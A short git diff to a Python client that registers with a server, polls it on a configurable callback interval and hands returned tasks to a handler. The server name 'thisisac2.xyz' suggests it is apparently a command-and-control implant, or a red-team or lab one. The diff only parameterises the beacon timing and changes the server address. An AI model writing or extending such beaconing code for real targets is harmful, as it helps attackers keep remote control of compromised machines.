@@ -6,9 +6,10 @@ import platform
 
 class Client:
 
-    def __init__(self,server_ip, port):
+    def __init__(self,server_ip, port=80,callback_interval=120):
         self.server_ip = server_ip
         self.port = port
+        self.callback_interval = callback_interval
         if platform.system() == "Linux":
             self.local_ip = subprocess.run("hostname -I | awk '{print $1}'", shell=True, capture_output=True, text=True).stdout.strip()
         else:
@@ -60,21 +61,21 @@ class Client:
                     self.register()
                     continue
                 if req.status_code not in [200, 201, 204]:
-                    time.sleep(120)
+                    time.sleep(self.callback_interval)
                     continue
                 elif req.status_code == 204:
                     #print("No tasks")
-                    time.sleep(120)
+                    time.sleep(self.callback_interval)
                     continue
                 tasks = req.json()
                 self.handle_task(tasks)
             except Exception as e:
-                time.sleep(120)
+                time.sleep(self.callback_interval)
                 continue
                 #print(e)
 
 def main():
-    client = Client("10.50.0.12", 80)
+    client = Client("thisisac2.xyz")
     client.run()
 
 if __name__ == '__main__':
